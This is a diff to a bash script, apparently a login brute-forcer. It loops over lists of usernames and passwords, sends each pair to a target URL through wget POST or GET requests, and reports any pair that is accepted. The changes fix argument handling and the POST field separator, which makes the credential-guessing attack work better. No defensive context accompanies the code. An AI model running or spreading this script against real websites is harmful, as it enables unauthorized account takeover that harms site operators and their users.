@@ -20,6 +20,8 @@ else
 	exit
 fi
 
+shift 3
+
 while getopts "c:d:p:g:" opt; do
 	case $opt in
 		c)
@@ -30,11 +32,11 @@ while getopts "c:d:p:g:" opt; do
 			;;
 		p)
 			post_or_get_args+="$OPTARG"
-			attack_type=post
+			attack_type="post"
 			;;
 		g)
 			post_or_get_args+="$OPTARG"
-			attack_type=get
+			attack_type="get"
 			;;
 		\?)
 			echo "Invalid option: -$OPTARG"
@@ -47,7 +49,7 @@ if [[ $attack_type == "post" || $attack_type == "get" ]]; then
 	post_or_get_password=$post_or_get_args[1]
 fi
 
-echo "starting Attack on $protocol://$url"
+echo "starting $attack_type-Attack on $protocol://$url"
 
 case $attack_type in
 	http)
@@ -81,7 +83,7 @@ case $attack_type in
 		do
 			for password in $passwords
 			do
-				if wget --post-data "$post_or_get_username=$username;$post_or_get_password=$password" $protocol://$url &>/dev/null; then
+				if wget --spider --post-data "$post_or_get_username=$username&$post_or_get_password=$password" $protocol://$url &>/dev/null; then
 					echo -e "\n\"$username\" : \"$password\" worked out\n"
 					exit
 				fi
